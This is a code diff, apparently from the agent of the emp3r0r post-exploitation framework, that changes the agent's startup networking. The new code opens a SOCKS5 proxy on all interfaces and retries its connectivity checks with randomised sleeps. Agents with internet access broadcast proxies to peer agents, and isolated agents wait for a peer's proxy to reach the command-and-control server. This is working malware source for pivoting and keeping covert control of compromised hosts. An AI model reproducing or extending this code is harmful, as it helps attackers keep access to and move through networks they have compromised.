@@ -161,29 +161,61 @@ func main() {
 		}
 	}
 
-	// do we have internet?
-	if tun.HasInternetAccess() {
-		// if we do, we are feeling helpful
-		ctx, cancel := context.WithCancel(context.Background())
-		log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
-		go agent.StartBroadcast(true, ctx, cancel)
-
-	} else if !tun.IsTor(emp3r0r_data.CCAddress) && !tun.IsProxyOK(emp3r0r_data.AgentProxy) {
-		// we don't, just wait for some other agents to help us
-		log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
-		ctx, cancel := context.WithCancel(context.Background())
-		go func() {
-			err := agent.BroadcastServer(ctx, cancel, "")
+	// socks5 proxy
+	go func() {
+		// start a socks5 proxy
+		err := agent.Socks5Proxy("on", "0.0.0.0:"+emp3r0r_data.ProxyPort)
+		if err != nil {
+			log.Printf("Socks5Proxy on: %v", err)
+			return
+		}
+		defer func() {
+			err := agent.Socks5Proxy("off", "0.0.0.0:"+emp3r0r_data.ProxyPort)
 			if err != nil {
-				log.Fatal(err)
+				log.Printf("Socks5Proxy off: %v", err)
 			}
 		}()
-		for ctx.Err() == nil {
-			if emp3r0r_data.AgentProxy != "" {
-				log.Printf("[+] Thank you! We got a proxy: %s", emp3r0r_data.AgentProxy)
-				break
+	}()
+
+	// do we have internet?
+	checkInternet := func(cnt int) bool {
+		defer func() { cnt++ }()
+		if tun.HasInternetAccess() {
+			// if we do, we are feeling helpful
+			if cnt == 0 {
+				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
+				ctx, cancel := context.WithCancel(context.Background())
+				go agent.StartBroadcast(true, ctx, cancel)
 			}
+			return true
+
+		} else if !tun.IsTor(emp3r0r_data.CCAddress) && !tun.IsProxyOK(emp3r0r_data.AgentProxy) {
+			// we don't, just wait for some other agents to help us
+			log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
+			if cnt == 0 {
+				ctx, cancel := context.WithCancel(context.Background())
+				go func() {
+					err := agent.BroadcastServer(ctx, cancel, "")
+					if err != nil {
+						log.Fatal(err)
+					}
+				}()
+				for ctx.Err() == nil {
+					if emp3r0r_data.AgentProxy != "" {
+						log.Printf("[+] Thank you! We got a proxy: %s", emp3r0r_data.AgentProxy)
+						return true
+					}
+				}
+			}
+			return false
 		}
+
+		return true
+	}
+	i := 0
+	for !checkInternet(i) {
+		log.Printf("[%d] Checking Internet connectivity...", i)
+		time.Sleep(time.Duration(util.RandInt(3, 20)) * time.Second)
 	}
 
 	// apply whatever proxy setting we have just added
